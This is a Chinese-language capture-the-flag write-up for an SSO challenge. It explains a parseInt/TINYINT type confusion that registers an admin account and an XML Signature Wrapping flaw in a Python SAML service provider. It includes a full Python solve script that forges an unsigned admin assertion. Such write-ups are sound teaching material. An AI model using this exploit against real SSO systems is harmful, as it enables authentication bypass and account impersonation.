# auth

## 题目简述

题目模拟 SSO：Node.js IdP 负责注册登录，Python SP 负责校验 SAML，flag 要求身份为 `admin@rois.team`。解法先利用 `parseInt(false)` 与 MySQL `TINYINT` 存储差异注册管理员，再利用 SP 的 XML Signature Wrapping 缺陷伪造第一个 Assertion。

## 解题过程

### 关键观察

题目模拟 SSO：Node.js IdP 负责注册登录，Python SP 负责校验 SAML，flag 要求身份为 `admin@rois.team`。

### 求解步骤

题目模拟了一个 SSO 认证环境，包含 Node.js 写的 IdP 和 Python 写的 SP。Flag在SP中，校验
SAML 身份必须是 admin@rois.team
IdP 的注册逻辑 idp-portal/src/controllers/authController.js ：
这里用了 parseInt(type) === 0  来判断是否是管理员注册。parseInt(false) ->  NaN，NaN
=== 0  为 false，因此发送{"type": false} 可以绕过邀请码检查。MySQL 的 TINYINT  字
段将 false  存储为 0 ，从而注册为 Admin

if (parseInt(type) === 0) {
    if (!invitationCode || invitationCode !== config.getInviteCode()) {
        // ... error
    }
}
req.session.userId = await User.create({ ..., type, ... });
不过注册成功后 IdP 会直接设置 Session req.session.userType = type  (false)。 但 middl
eware/auth.js  检查的是 req.session.userType !== 0 。所以需要重新登录一次
然后发起 SSO，得到合法的 SAMLResponse
在 sp-flag/saml2/validator.py ：
验证器确保有签名并且合法，但是不校验无签名的Assertion。 解析器 sp-flag/saml2/parse
r.py  只取第一个进行解析
这便存在 XML Signature Wrapping 漏洞
在合法Assertion前加入伪造Assertion即可
assertion_signatures = self._find_assertion_signatures()
if not assertion_signatures:
      return False
for sig_node in assertion_signatures:
    if not self._verify_signature(sig_node):
        return False
def get_nameid(self):
  if self.document is None:
      return None

  assertions = self.document.xpath(
      '//saml:Assertion',
      namespaces=self.NAMESPACES
  )

  if not assertions:
      return None

  assertion = assertions[0]  # 直接取第一个
  nameid_nodes = assertion.xpath(
      './/saml:NameID',
      namespaces=self.NAMESPACES
  )

  if nameid_nodes:
      return nameid_nodes[0].text

  return None
import requests
import base64
import urllib.parse
from lxml import etree
import copy
import re
import random
import string

IDP_HOST = "<http://<idp-host>>"
SP_HOST = "<http://<sp-host>:<port>>"

def solve():
    s = requests.Session()
    # 注册登录
    rand_suffix = ''.join(random.choices(string.ascii_lowercase +
string.digits, k=6))
    username = f"hacker_{rand_suffix}"
    password = "password123"
    email = f"hacker_{rand_suffix}@example.com"

    print(username, password, email)

    register_url = f"{IDP_HOST}/register"
    reg_data = {
        "username": username,
        "email": email,
        "password": password,
        "confirmPassword": password,
        "type": False, #
        "displayName": "Hacker"
    }
    s.post(register_url, json=reg_data)
    s.cookies.clear()

    login_url = f"{IDP_HOST}/login"
    s.post(login_url, data={"username": username, "password": password})

    # 获取合法的 SAML Response
    sso_init_url = f"{IDP_HOST}/saml/idp/Flag"
    res = s.get(sso_init_url)
    saml_response_b64 = re.search(r'name="SAMLResponse" value="([^"]+)"',
res.text).group(1)

    # XML Signature Wrapping
    xml_content = base64.b64decode(saml_response_b64).decode('utf-8')
    root = etree.fromstring(xml_content.encode('utf-8'))

### 跨页补回：SAML 包装 payload 收尾

ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion', 'ds':
'<http://www.w3.org/2000/09/xmldsig#>'}
    original_assertion = root.find('.//saml:Assertion', ns)
    fake_assertion = copy.deepcopy(original_assertion)
    fake_assertion.set('ID', f'_{urllib.parse.quote(username)}_fake')
    nameid_node = fake_assertion.find('.//saml:NameID', ns)
    nameid_node.text = 'admin@rois.team'
    signature_node = fake_assertion.find('.//ds:Signature', ns)
    if signature_node is not None:
        signature_node.getparent().remove(signature_node)
    root.insert(1, fake_assertion)

    evil_xml = etree.tostring(root, encoding='utf-8').decode('utf-8')
    evil_saml_response = base64.b64encode(evil_xml.encode('utf-
8')).decode('utf-8')

    # 认证
    sp_acs_url = f"{SP_HOST}/saml/acs"
    sp_session = requests.Session()
    res = sp_session.post(sp_acs_url, data={
        "SAMLResponse": evil_saml_response,
        "RelayState": "/admin"
    }, allow_redirects=False)

    redirect_url = res.headers.get('Location')
    target_url = f"{SP_HOST}{redirect_url}" if redirect_url.startswith("/")
else redirect_url
    final_res = sp_session.get(target_url)
    print(final_res.text)

if __name__ == "__main__":
    solve()

## 方法总结

- 核心技巧：类型混淆注册管理员 + XML Signature Wrapping。
- 识别信号：注册逻辑和数据库类型转换不一致，SAML 校验器与解析器选取 Assertion 的规则不同。
- 复用要点：签名验证通过不等于业务解析对象被签名，需检查 parser 实际读取哪个节点。
